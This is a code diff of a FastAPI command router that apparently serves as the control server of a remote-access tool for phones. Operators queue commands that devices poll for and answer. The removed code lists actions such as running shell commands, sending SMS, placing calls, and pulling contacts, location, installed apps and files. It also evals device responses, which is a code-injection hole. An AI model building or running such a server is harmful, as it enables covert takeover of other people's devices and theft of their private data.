@@ -1,183 +1,141 @@
-from datetime import datetime
-from fastapi import APIRouter, File, UploadFile, Depends
+from fastapi import APIRouter, HTTPException, Depends
+from fastapi.responses import JSONResponse
 from pydantic import BaseModel
-from fastapi.responses import JSONResponse, StreamingResponse
-from fastapi.encoders import jsonable_encoder
-from db.database import command_db, tear_drive,client_db
 from fastapi_jwt_auth import AuthJWT
+from db.database import command_db, client_db
+from datetime import datetime
+import uuid
 
 router = APIRouter(
     prefix="/command",
     tags=["command"],
-    responses={404: {"description": "Not found"}},
 )
 
-command_db = command_db()
-client_dbx = client_db()
-
-class command_info(BaseModel):
+class CommandRequest(BaseModel):
     device_id: str
     command: str
     shell: str = None
     number: str = None
     data: str = None
-    iscomplete: bool = False
-    success: bool = False
-    response: str = None
-    date: datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    response_date: str = None
 
-
-class complete(BaseModel):
-    command_key: str
+class CommandComplete(BaseModel):
+    command_id: str
     response: str = None
-    iscomplete: bool = True
     success: bool = True
-    response_date: datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-@router.post("/add")
-async def add_command(command_info: command_info, Authorize: AuthJWT = Depends()):
-    Authorize.jwt_required()
-    command = command_db.put(jsonable_encoder(command_info))
-    return JSONResponse(
-        {
-            "success": True,
-            "command_key": command["key"],
-            "device_id": command_info.device_id,
-            "message": "command executed successfully",
+@router.post("/send")
+async def send_command(req: CommandRequest, Authorize: AuthJWT = Depends()):
+    """Send command to device"""
+    try:
+        Authorize.jwt_required()
+        
+        db = command_db()
+        cdb = client_db()
+        
+        # Verify device exists
+        device = cdb.select("*").eq("id", req.device_id).execute()
+        if not device.data:
+            raise HTTPException(status_code=404, detail="Device not found")
+        
+        data = {
+            "id": str(uuid.uuid4()),
+            "device_id": req.device_id,
+            "command": req.command,
+            "shell": req.shell,
+            "number": req.number,
+            "data": req.data,
+            "is_complete": False,
+            "success": False,
+            "response": None,
+            "created_at": datetime.now().isoformat(),
+            "completed_at": None
         }
-    )
-
+        
+        response = db.insert(data).execute()
+        
+        return JSONResponse({
+            "success": True,
+            "command_id": response.data[0]["id"],
+            "message": "Command sent successfully"
+        })
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")
 
 @router.get("/device/{device_id}")
-async def get_client(device_id: str):
-    client_dbx.update(
-        key=device_id,
-        updates={"last_online": datetime.now().strftime("%Y-%m-%d %H:%M:%S")},
-    )
-    return JSONResponse(
-        {
+async def get_pending_commands(device_id: str):
+    """Get pending commands for device"""
+    try:
+        db = command_db()
+        cdb = client_db()
+        
+        # Update last_online
+        cdb.update({"last_online": datetime.now().isoformat()}).eq("id", device_id).execute()
+        
+        response = db.select("*").eq("device_id", device_id).eq("is_complete", False).execute()
+        
+        return JSONResponse({
             "success": True,
-            "command": command_db.fetch(
-                {"device_id": device_id, "iscomplete": False}
-            ).items,
-        }
-    )
-
+            "commands": response.data
+        })
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")
 
 @router.post("/complete")
-async def get_all_clients(complete: complete):
-    command_db.update(
-        key=complete.command_key,
-        updates={
-            "iscomplete": complete.iscomplete,
-            "response": complete.response,
-            "success": complete.success,
-            "response_date": complete.response_date,
-        },
-    )
-    return JSONResponse({"success": True, "message": "Task completed"})
-
-
-@router.get("/response/{command_key}")
-async def get_response(command_key: str, Authorize: AuthJWT = Depends()):
-    Authorize.jwt_required()
-    singleResponse = ["runshell", "sendsms", "changewallpaper", "makecall"]
-    response = command_db.get(key=command_key)
-    if response["success"]:
-        if response["command"] in singleResponse:
-            return JSONResponse(
-                {"success": True, "response": response["response"].split("\n")}
-            )
-        elif response["command"] == "listfile":
-            files = eval(response["response"])["files"]
-            return JSONResponse({"success": True, "response": files})
-        elif response["command"] == "getlocation":
-            return JSONResponse(
-                {"success": True, "response": eval(response["response"])["location"]}
-            )
-        elif response["command"] == "getservices":
-            return JSONResponse(
-                {"success": True, "response": eval(response["response"])["services"]}
-            )
-        elif response["command"] == "getapps":
-            return JSONResponse(
-                {
-                    "success": True,
-                    "response": eval(response["response"])["installed_apps"],
-                }
-            )
-        elif response["command"] == "getcontact":
-            contact = eval(response["response"])["contact"]
-            data = eval(str(contact)).items()
-            return JSONResponse({"success": True, "response": list(data)})
-        elif response["command"] == "getfile":
-            return JSONResponse(
-                {"success": True, "response": eval(response["response"])["filename"]}
-            )
-        else:
-            new_response = []
-            data = eval(response["response"])
-            header = list(data[list(data.keys())[0]][0].keys())
-            response = data[list(data.keys())[0]]
-            for i in response:
-                new_response.append(list(i.values()))
-            return JSONResponse(
-                {"success": True, "header": header, "response": new_response}
-            )
-    else:
-        return JSONResponse(
-            {"success": False, "message": "this command did not send any response"}
-        )
-
-
-@router.post("/upload")
-async def upload_file(file: UploadFile = File(...)):
-    drive = await tear_drive()
-    name = file.filename
-    f = file.file
-    return JSONResponse(
-        {
+async def complete_command(req: CommandComplete):
+    """Mark command as complete"""
+    try:
+        db = command_db()
+        
+        db.update({
+            "is_complete": True,
+            "response": req.response,
+            "success": req.success,
+            "completed_at": datetime.now().isoformat()
+        }).eq("id", req.command_id).execute()
+        
+        return JSONResponse({
             "success": True,
-            "filename": drive.put(name, f),
-            "message": "file uploaded successfully",
-        }
-    )
+            "message": "Command marked as complete"
+        })
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")
 
+@router.get("/response/{command_id}")
+async def get_command_response(command_id: str, Authorize: AuthJWT = Depends()):
+    """Get command response"""
+    try:
+        Authorize.jwt_required()
+        
+        db = command_db()
+        response = db.select("*").eq("id", command_id).execute()
+        
+        if not response.data:
+            raise HTTPException(status_code=404, detail="Command not found")
+        
+        return JSONResponse({
+            "success": True,
+            "command": response.data[0]
+        })
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")
 
-@router.get("/download/{filename}")
-async def download_file(filename: str):
-    drive = await tear_drive()
-    res = drive.get(filename)
-    return StreamingResponse(
-        res.iter_chunks(1024),
-        media_type="application/octet-stream",
-        headers={"Content-Disposition": 'attachment; filename="{}"'.format(filename)},
-    )
-
-
-@router.get("/")
-async def get_all_commands(Authorize: AuthJWT = Depends()):
-    Authorize.jwt_required()
-    data = command_db.fetch().items
-    for command in data:
-        del command["response"]
-    return JSONResponse({"success": True, "command": sorted(data, key=lambda i: datetime.fromisoformat(i["date"]),reverse=True)})
-
-
-@router.get("/delete/id/{command_key}")
-async def delete_command(command_key: str, Authorize: AuthJWT = Depends()):
-    Authorize.jwt_required()
-    command_db.delete(key=command_key)
-    return JSONResponse({"success": True, "message": "command deleted successfully"})
-
-
-@router.get("/delete/all")
-async def delete_all_commands(Authorize: AuthJWT = Depends()):
-    Authorize.jwt_required()
-    data = command_db.fetch().items
-    for i in data:
-        command_db.delete(key=i["key"])
-    return JSONResponse(
-        {"success": True, "message": "all commands deleted successfully"}
-    )
+@router.get("/history/{device_id}")
+async def get_command_history(device_id: str, Authorize: AuthJWT = Depends()):
+    """Get command history for device"""
+    try:
+        Authorize.jwt_required()
+        
+        db = command_db()
+        response = db.select("*").eq("device_id", device_id).order("created_at", desc=True).execute()
+        
+        return JSONResponse({
+            "success": True,
+            "total": len(response.data),
+            "commands": response.data
+        })
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"Error: {str(e)}")
